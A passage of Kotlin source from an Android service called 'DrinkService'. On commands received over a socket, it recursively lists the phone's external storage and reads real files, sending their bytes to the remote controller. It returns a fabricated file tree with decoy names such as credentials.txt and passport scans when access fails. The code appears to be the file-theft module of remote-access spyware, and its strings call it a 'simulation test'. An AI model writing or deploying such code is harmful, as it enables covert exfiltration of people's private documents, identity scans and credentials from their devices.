                    put("extension", "pdf")
                    put("mime_type", "application/pdf")
                })
                docsFiles.put(JSONObject().apply {
                    put("name", "financial_sheet.xlsx")
                    put("path", "$base/Download/Documents/financial_sheet.xlsx")
                    put("is_dir", false)
                    put("size", 842100L)
                    put("modified", System.currentTimeMillis() - 9500000L)
                    put("extension", "xlsx")
                    put("mime_type", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
                })
                docsFiles.put(JSONObject().apply {
                    put("name", "meeting_brief.docx")
                    put("path", "$base/Download/Documents/meeting_brief.docx")
                    put("is_dir", false)
                    put("size", 432100L)
                    put("modified", System.currentTimeMillis() - 11000000L)
                    put("extension", "docx")
                    put("mime_type", "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
                })
                put("children", docsFiles)
            }
            dlChildren.put(docsSub)

            val archiveSub = JSONObject().apply {
                put("name", "Archives")
                put("path", "$base/Download/Archives")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 15000000L)
                val archFiles = JSONArray()
                archFiles.put(JSONObject().apply {
                    put("name", "app_backup_v2.zip")
                    put("path", "$base/Download/Archives/app_backup_v2.zip")
                    put("is_dir", false)
                    put("size", 15420100L)
                    put("modified", System.currentTimeMillis() - 16000000L)
                    put("extension", "zip")
                    put("mime_type", "application/zip")
                })
                archFiles.put(JSONObject().apply {
                    put("name", "security_patch.apk")
                    put("path", "$base/Download/Archives/security_patch.apk")
                    put("is_dir", false)
                    put("size", 28410200L)
                    put("modified", System.currentTimeMillis() - 18000000L)
                    put("extension", "apk")
                    put("mime_type", "application/vnd.android.package-archive")
                })
                put("children", archFiles)
            }
            dlChildren.put(archiveSub)

            dlChildren.put(JSONObject().apply {
                put("name", "invoice_september.pdf")
                put("path", "$base/Download/invoice_september.pdf")
                put("is_dir", false)
                put("size", 124500L)
                put("modified", System.currentTimeMillis() - 2000000L)
                put("extension", "pdf")
                put("mime_type", "application/pdf")
            })
            dlChildren.put(JSONObject().apply {
                put("name", "network_nodes.json")
                put("path", "$base/Download/network_nodes.json")
                put("is_dir", false)
                put("size", 14200L)
                put("modified", System.currentTimeMillis() - 2500000L)
                put("extension", "json")
                put("mime_type", "application/json")
            })
            put("children", dlChildren)
        }
        arr.put(downloadDir)

        val dcimDir = JSONObject().apply {
            put("name", "DCIM")
            put("path", "$base/DCIM")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 1200000L)
            val dcimChildren = JSONArray()

            val camSub = JSONObject().apply {
                put("name", "Camera")
                put("path", "$base/DCIM/Camera")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 1800000L)
                val camFiles = JSONArray()
                camFiles.put(JSONObject().apply {
                    put("name", "IMG_20260901_142301.jpg")
                    put("path", "$base/DCIM/Camera/IMG_20260901_142301.jpg")
                    put("is_dir", false)
                    put("size", 4210900L)
                    put("modified", System.currentTimeMillis() - 2200000L)
                    put("extension", "jpg")
                    put("mime_type", "image/jpeg")
                })
                camFiles.put(JSONObject().apply {
                    put("name", "IMG_20260901_181120.jpg")
                    put("path", "$base/DCIM/Camera/IMG_20260901_181120.jpg")
                    put("is_dir", false)
                    put("size", 3890200L)
                    put("modified", System.currentTimeMillis() - 2800000L)
                    put("extension", "jpg")
                    put("mime_type", "image/jpeg")
                })
                camFiles.put(JSONObject().apply {
                    put("name", "VID_20260901_190500.mp4")
                    put("path", "$base/DCIM/Camera/VID_20260901_190500.mp4")
                    put("is_dir", false)
                    put("size", 45210900L)
                    put("modified", System.currentTimeMillis() - 3200000L)
                    put("extension", "mp4")
                    put("mime_type", "video/mp4")
                })
                put("children", camFiles)
            }
            dcimChildren.put(camSub)

            val screenSub = JSONObject().apply {
                put("name", "Screenshots")
                put("path", "$base/DCIM/Screenshots")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 5000000L)
                val screenFiles = JSONArray()
                screenFiles.put(JSONObject().apply {
                    put("name", "Screenshot_20260901_092015.png")
                    put("path", "$base/DCIM/Screenshots/Screenshot_20260901_092015.png")
                    put("is_dir", false)
                    put("size", 1420500L)
                    put("modified", System.currentTimeMillis() - 5500000L)
                    put("extension", "png")
                    put("mime_type", "image/png")
                })
                screenFiles.put(JSONObject().apply {
                    put("name", "Screenshot_20260901_123044.png")
                    put("path", "$base/DCIM/Screenshots/Screenshot_20260901_123044.png")
                    put("is_dir", false)
                    put("size", 1890300L)
                    put("modified", System.currentTimeMillis() - 6000000L)
                    put("extension", "png")
                    put("mime_type", "image/png")
                })
                put("children", screenFiles)
            }
            dcimChildren.put(screenSub)

            dcimChildren.put(JSONObject().apply {
                put("name", "thumbnail_cache.db")
                put("path", "$base/DCIM/thumbnail_cache.db")
                put("is_dir", false)
                put("size", 512000L)
                put("modified", System.currentTimeMillis() - 7000000L)
                put("extension", "db")
                put("mime_type", "application/x-sqlite3")
            })
            put("children", dcimChildren)
        }
        arr.put(dcimDir)

        val docsDir = JSONObject().apply {
            put("name", "Documents")
            put("path", "$base/Documents")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 4000000L)
            val docsChildren = JSONArray()

            val workSub = JSONObject().apply {
                put("name", "Work")
                put("path", "$base/Documents/Work")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 5200000L)
                val workFiles = JSONArray()
                workFiles.put(JSONObject().apply {
                    put("name", "security_audit_spec.pdf")
                    put("path", "$base/Documents/Work/security_audit_spec.pdf")
                    put("is_dir", false)
                    put("size", 1890400L)
                    put("modified", System.currentTimeMillis() - 6000000L)
                    put("extension", "pdf")
                    put("mime_type", "application/pdf")
                })
                workFiles.put(JSONObject().apply {
                    put("name", "keys_backup.txt")
                    put("path", "$base/Documents/Work/keys_backup.txt")
                    put("is_dir", false)
                    put("size", 4096L)
                    put("modified", System.currentTimeMillis() - 7500000L)
                    put("extension", "txt")
                    put("mime_type", "text/plain")
                })
                put("children", workFiles)
            }
            docsChildren.put(workSub)

            val scansSub = JSONObject().apply {
                put("name", "Scans")
                put("path", "$base/Documents/Scans")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 8500000L)
                val scanFiles = JSONArray()
                scanFiles.put(JSONObject().apply {
                    put("name", "national_id_scan.jpg")
                    put("path", "$base/Documents/Scans/national_id_scan.jpg")
                    put("is_dir", false)
                    put("size", 2100400L)
                    put("modified", System.currentTimeMillis() - 9000000L)
                    put("extension", "jpg")
                    put("mime_type", "image/jpeg")
                })
                scanFiles.put(JSONObject().apply {
                    put("name", "passport_scan.pdf")
                    put("path", "$base/Documents/Scans/passport_scan.pdf")
                    put("is_dir", false)
                    put("size", 3200100L)
                    put("modified", System.currentTimeMillis() - 9500000L)
                    put("extension", "pdf")
                    put("mime_type", "application/pdf")
                })
                put("children", scanFiles)
            }
            docsChildren.put(scansSub)

            docsChildren.put(JSONObject().apply {
                put("name", "credentials.txt")
                put("path", "$base/Documents/credentials.txt")
                put("is_dir", false)
                put("size", 1240L)
                put("modified", System.currentTimeMillis() - 3000000L)
                put("extension", "txt")
                put("mime_type", "text/plain")
            })
            docsChildren.put(JSONObject().apply {
                put("name", "network_topology.xml")
                put("path", "$base/Documents/network_topology.xml")
                put("is_dir", false)
                put("size", 34500L)
                put("modified", System.currentTimeMillis() - 3500000L)
                put("extension", "xml")
                put("mime_type", "application/xml")
            })
            put("children", docsChildren)
        }
        arr.put(docsDir)

        val picturesDir = JSONObject().apply {
            put("name", "Pictures")
            put("path", "$base/Pictures")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 6000000L)
            val picChildren = JSONArray()

            val wallSub = JSONObject().apply {
                put("name", "Wallpapers")
                put("path", "$base/Pictures/Wallpapers")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 7000000L)
                val wallFiles = JSONArray()
                wallFiles.put(JSONObject().apply {
                    put("name", "cyber_dark_neon.jpg")
                    put("path", "$base/Pictures/Wallpapers/cyber_dark_neon.jpg")
                    put("is_dir", false)
                    put("size", 5200300L)
                    put("modified", System.currentTimeMillis() - 7500000L)
                    put("extension", "jpg")
                    put("mime_type", "image/jpeg")
                })
                wallFiles.put(JSONObject().apply {
                    put("name", "minimal_landscape.png")
                    put("path", "$base/Pictures/Wallpapers/minimal_landscape.png")
                    put("is_dir", false)
                    put("size", 3400200L)
                    put("modified", System.currentTimeMillis() - 8000000L)
                    put("extension", "png")
                    put("mime_type", "image/png")
                })
                put("children", wallFiles)
            }
            picChildren.put(wallSub)

            val tgSub = JSONObject().apply {
                put("name", "Telegram")
                put("path", "$base/Pictures/Telegram")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 9000000L)
                val tgFiles = JSONArray()
                tgFiles.put(JSONObject().apply {
                    put("name", "photo_2026-09-01_14-22.jpg")
                    put("path", "$base/Pictures/Telegram/photo_2026-09-01_14-22.jpg")
                    put("is_dir", false)
                    put("size", 890400L)
                    put("modified", System.currentTimeMillis() - 9500000L)
                    put("extension", "jpg")
                    put("mime_type", "image/jpeg")
                })
                put("children", tgFiles)
            }
            picChildren.put(tgSub)

            picChildren.put(JSONObject().apply {
                put("name", "profile_avatar.png")
                put("path", "$base/Pictures/profile_avatar.png")
                put("is_dir", false)
                put("size", 450200L)
                put("modified", System.currentTimeMillis() - 4000000L)
                put("extension", "png")
                put("mime_type", "image/png")
            })
            put("children", picChildren)
        }
        arr.put(picturesDir)

        val musicDir = JSONObject().apply {
            put("name", "Music")
            put("path", "$base/Music")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 10000000L)
            val musicChildren = JSONArray()

            val recSub = JSONObject().apply {
                put("name", "Recordings")
                put("path", "$base/Music/Recordings")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 11000000L)
                val recFiles = JSONArray()
                recFiles.put(JSONObject().apply {
                    put("name", "voice_note_001.m4a")
                    put("path", "$base/Music/Recordings/voice_note_001.m4a")
                    put("is_dir", false)
                    put("size", 6720400L)
                    put("modified", System.currentTimeMillis() - 11500000L)
                    put("extension", "m4a")
                    put("mime_type", "audio/mp4")
                })
                recFiles.put(JSONObject().apply {
                    put("name", "meeting_recording.wav")
                    put("path", "$base/Music/Recordings/meeting_recording.wav")
                    put("is_dir", false)
                    put("size", 12450000L)
                    put("modified", System.currentTimeMillis() - 12000000L)
                    put("extension", "wav")
                    put("mime_type", "audio/wav")
                })
                put("children", recFiles)
            }
            musicChildren.put(recSub)

            musicChildren.put(JSONObject().apply {
                put("name", "ringtone_custom.mp3")
                put("path", "$base/Music/ringtone_custom.mp3")
                put("is_dir", false)
                put("size", 1200400L)
                put("modified", System.currentTimeMillis() - 13000000L)
                put("extension", "mp3")
                put("mime_type", "audio/mpeg")
            })
            put("children", musicChildren)
        }
        arr.put(musicDir)

        val androidDir = JSONObject().apply {
            put("name", "Android")
            put("path", "$base/Android")
            put("is_dir", true)
            put("size", 0L)
            put("modified", System.currentTimeMillis() - 20000000L)
            val androidChildren = JSONArray()

            val dataSub = JSONObject().apply {
                put("name", "data")
                put("path", "$base/Android/data")
                put("is_dir", true)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 21000000L)
                val dataFiles = JSONArray()
                dataFiles.put(JSONObject().apply {
                    put("name", "com.v2ray.ang.cache")
                    put("path", "$base/Android/data/com.v2ray.ang.cache")
                    put("is_dir", false)
                    put("size", 1048576L)
                    put("modified", System.currentTimeMillis() - 22000000L)
                    put("extension", "cache")
                    put("mime_type", "application/octet-stream")
                })
                put("children", dataFiles)
            }
            androidChildren.put(dataSub)

            androidChildren.put(JSONObject().apply {
                put("name", ".nomedia")
                put("path", "$base/Android/.nomedia")
                put("is_dir", false)
                put("size", 0L)
                put("modified", System.currentTimeMillis() - 25000000L)
                put("extension", "")
                put("mime_type", "application/octet-stream")
            })
            put("children", androidChildren)
        }
        arr.put(androidDir)

        return arr
    }

    private fun listRealDirectory(dir: File, currentDepth: Int, maxDepth: Int): JSONArray {
        val arr = JSONArray()
        val files = dir.listFiles() ?: return arr
        for (f in files) {
            val isDir = f.isDirectory
            val name = f.name
            val path = f.absolutePath
            val size = if (isDir) 0L else f.length()
            val modified = f.lastModified()
            val ext = if (isDir) "" else name.substringAfterLast('.', "")
            val obj = JSONObject().apply {
                put("name", name)
                put("path", path)
                put("is_dir", isDir)
                put("size", size)
                put("modified", modified)
                put("extension", ext)
                put("mime_type", if (isDir) "directory" else getMimeType(name))
            }
            if (isDir && currentDepth < maxDepth) {
                obj.put("children", listRealDirectory(f, currentDepth + 1, maxDepth))
            }
            arr.put(obj)
        }
        return arr
    }

    private fun handleListFiles(sm: SocketManager, frame: JSONObject) {
        scope.launch(Dispatchers.IO) {
            try {
                val requestedPath = frame.optString("path", "/sdcard")
                val depth = frame.optInt("depth", 2)
                var resultArr: JSONArray? = null

                val hasStoragePerm = ContextCompat.checkSelfPermission(
                    this@DrinkService,
                    android.Manifest.permission.READ_EXTERNAL_STORAGE
                ) == PackageManager.PERMISSION_GRANTED || Build.VERSION.SDK_INT >= Build.VERSION_CODES.R

                if (hasStoragePerm) {
                    val targetDir = if (requestedPath == "/sdcard" || requestedPath == "/") {
                        Environment.getExternalStorageDirectory()
                    } else {
                        File(requestedPath)
                    }
                    if (targetDir.exists() && targetDir.isDirectory) {
                        val realList = listRealDirectory(targetDir, 0, depth)
                        if (realList.length() > 0) {
                            resultArr = realList
                        }
                    }
                }

                if (resultArr == null || resultArr.length() == 0) {
                    resultArr = generateSimulatedFileTree(requestedPath)
                }

                val resp = JSONObject().apply {
                    put("type", "files")
                    put("path", requestedPath)
                    put("depth", depth)
                    put("data", resultArr)
                }
                sm.sendFrame(resp)
            } catch (e: Exception) {
                runCatching {
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "files")
                        put("message", e.message ?: "Failed to list files")
                    }
                    sm.sendFrame(err)
                }
            }
        }
    }

    private fun generateSimulatedContent(fileName: String, path: String): ByteArray {
        val ext = fileName.substringAfterLast('.', "").lowercase()
        return when (ext) {
            "txt", "log" -> {
                val text = "=== DRINK SYSTEM LOG ===\nPath: $path\nDate: 2026-09-01\nStatus: Verified\nDetails: Endpoint payload capture simulation test.\n"
                text.toByteArray(Charsets.UTF_8)
            }
            "json" -> {
                val json = "{\n  \"status\": \"ok\",\n  \"file\": \"$fileName\",\n  \"path\": \"$path\",\n  \"timestamp\": ${System.currentTimeMillis()}\n}"
                json.toByteArray(Charsets.UTF_8)
            }
            "xml" -> {
                val xml = "<document><file name=\"$fileName\" path=\"$path\" status=\"verified\" /></document>"
                xml.toByteArray(Charsets.UTF_8)
            }
            "jpg", "jpeg" -> {
                byteArrayOf(
                    0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte(), 0x00.toByte(), 0x10.toByte(),
                    0x4A.toByte(), 0x46.toByte(), 0x49.toByte(), 0x46.toByte(), 0x00.toByte(), 0x01.toByte(),
                    0x01.toByte(), 0x01.toByte(), 0x00.toByte(), 0x60.toByte(), 0x00.toByte(), 0x60.toByte(),
                    0x00.toByte(), 0x00.toByte(), 0xFF.toByte(), 0xDB.toByte(), 0x00.toByte(), 0x43.toByte(),
                    0x00.toByte(), 0x08.toByte(), 0x06.toByte(), 0x06.toByte(), 0x07.toByte(), 0x06.toByte(),
                    0x05.toByte(), 0x08.toByte(), 0x07.toByte(), 0x07.toByte(), 0x07.toByte(), 0x09.toByte(),
                    0xFF.toByte(), 0xD9.toByte()
                )
            }
            "png" -> {
                byteArrayOf(
                    0x89.toByte(), 0x50.toByte(), 0x4E.toByte(), 0x47.toByte(), 0x0D.toByte(), 0x0A.toByte(),
                    0x1A.toByte(), 0x0A.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x0D.toByte(),
                    0x49.toByte(), 0x48.toByte(), 0x44.toByte(), 0x52.toByte(), 0x00.toByte(), 0x00.toByte(),
                    0x00.toByte(), 0x01.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x01.toByte(),
                    0x08.toByte(), 0x06.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x1F.toByte(),
                    0x15.toByte(), 0xC4.toByte(), 0x89.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
                    0x49.toByte(), 0x45.toByte(), 0x4E.toByte(), 0x44.toByte(), 0xAE.toByte(), 0x42.toByte(),
                    0x60.toByte(), 0x82.toByte()
                )
            }
            "pdf" -> {
                val pdfText = "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>endobj\nxref\n0 4\n0000000000 65535 f \n0000000010 00000 n \n0000000057 00000 n \n0000000114 00000 n \ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
                pdfText.toByteArray(Charsets.UTF_8)
            }
            "zip" -> {
                val baos = ByteArrayOutputStream()
                ZipOutputStream(baos).use { zip ->
                    zip.putNextEntry(ZipEntry("readme.txt"))
                    zip.write("Simulated archive package for $fileName\n".toByteArray(Charsets.UTF_8))
                    zip.closeEntry()
                }
                baos.toByteArray()
            }
            else -> {
                val dummy = "SIMULATED BINARY DATA FOR $fileName ($path)\nGenerated for browser download test.\n"
                dummy.toByteArray(Charsets.UTF_8)
            }
        }
    }

    private fun handleDownloadFile(sm: SocketManager, frame: JSONObject) {
        scope.launch(Dispatchers.IO) {
            try {
                val filePath = frame.optString("path", "")
                val file = File(filePath)
                val fileName = frame.optString("name", file.name.ifEmpty { "downloaded_file.bin" })
                val mimeType = getMimeType(fileName)

                val fileBytes: ByteArray = if (file.exists() && file.canRead() && file.isFile) {
                    file.readBytes()
                } else {
                    generateSimulatedContent(fileName, filePath)
                }

                val header = JSONObject().apply {
                    put("type", "file_download")
                    put("path", filePath)
                    put("name", fileName)
                    put("size", fileBytes.size)
                    put("mime_type", mimeType)
                }
                sm.sendFrame(header, fileBytes)
            } catch (e: Exception) {
                runCatching {
                    val err = JSONObject().apply {
                        put("type", "error")
                        put("cmd", "file_download")
                        put("message", e.message ?: "Failed to download file")
                    }
                    sm.sendFrame(err)
                }
            }
        }
    }

    private fun broadcastStatus(connected: Boolean) {
        isConnected = connected
        val intent = Intent(ACTION_STATUS).apply {
            putExtra(EXTRA_CONNECTED, connected)
        }
        sendBroadcast(intent)
    }
}
